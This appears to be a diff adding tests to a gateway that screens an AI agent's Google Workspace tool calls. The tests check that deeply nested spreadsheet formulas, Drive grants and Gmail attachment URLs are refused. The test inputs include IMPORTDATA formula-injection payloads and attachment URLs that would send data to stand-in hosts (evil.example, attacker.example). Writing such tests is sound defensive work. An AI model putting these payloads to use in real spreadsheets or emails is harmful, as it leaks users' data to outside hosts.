@@ -535,3 +535,64 @@ def test_folded_formula_spellings_refused(cell: str) -> None:
                    {"file_name": "x.csv", "content": f"a,{cell}\"https://evil.example/?q=S\")\n"})
     assert session_call.await_count == 0
     assert "formula" in json.loads(result)["error"]
+
+
+# ---------------------------------------------------------------------------
+# Review of the PR: the walks fail closed at the depth cap, at every boundary
+# ---------------------------------------------------------------------------
+
+
+def _buried(payload: Any, depth: int) -> Any:
+    for _ in range(depth):
+        payload = [payload]
+    return payload
+
+
+@pytest.mark.parametrize("depth", [31, 32, 33, 34, 60])
+def test_formula_buried_at_any_depth_is_refused(depth: int) -> None:
+    """Shallower than the cap it is read and refused; deeper, it is unread and
+    refused — never forwarded."""
+    gateway, session_call = _make_gateway()
+    result = _call(gateway, "google_workspace__manage_conditional_formatting",
+                   {"spreadsheet_id": "s",
+                    "custom_formula": _buried("=IMPORTDATA(\"https://evil.example/?q=S\")", depth)})
+    assert session_call.await_count == 0
+    assert "formula" in json.loads(result)["error"] or "nested this deep" in json.loads(result)["error"]
+
+
+@pytest.mark.parametrize("depth", [31, 32, 33, 60])
+def test_grantee_buried_at_any_depth_is_refused(depth: int) -> None:
+    gateway, session_call = _make_gateway()
+    result = _call(gateway, "google_workspace__manage_drive_access",
+                   {"file_id": "f", "action": "grant", "permissions": _buried({"email": STRANGER}, depth)})
+    assert session_call.await_count == 0
+    err = json.loads(result)["error"]
+    assert STRANGER in err or "nested this deep" in err or "fetch" in err
+
+
+def test_shallow_nesting_still_passes() -> None:
+    gateway, session_call = _make_gateway()
+    _call(gateway, "google_workspace__manage_conditional_formatting",
+          {"spreadsheet_id": "s", "rules": _buried({"custom_formula": "=A1>5"}, 5)})
+    assert session_call.await_count == 1
+
+
+@pytest.mark.parametrize("attachments", [
+    [{"metadata": {"url": "https://attacker.example/?d=secret"}}],
+    [{"source": [{"nested": {"downloadUrl": "https://attacker.example/x"}}]}],
+    [_buried({"url": "https://attacker.example/x"}, 40)],
+])
+def test_attachment_url_at_any_depth_refused(attachments: Any) -> None:
+    gateway, session_call = _make_gateway()
+    result = _call(gateway, "google_workspace__send_gmail_message",
+                   {"to": ALICE, "subject": "s", "body": "b", "attachments": attachments})
+    assert session_call.await_count == 0
+    assert "attachment" in json.loads(result)["error"].lower()
+
+
+def test_attachment_with_nested_non_url_metadata_passes() -> None:
+    gateway, session_call = _make_gateway()
+    _call(gateway, "google_workspace__send_gmail_message",
+          {"to": ALICE, "subject": "s", "body": "b",
+           "attachments": [{"path": "/data/a.pdf", "meta": {"pages": 3, "title": "x"}}]})
+    assert session_call.await_count == 1
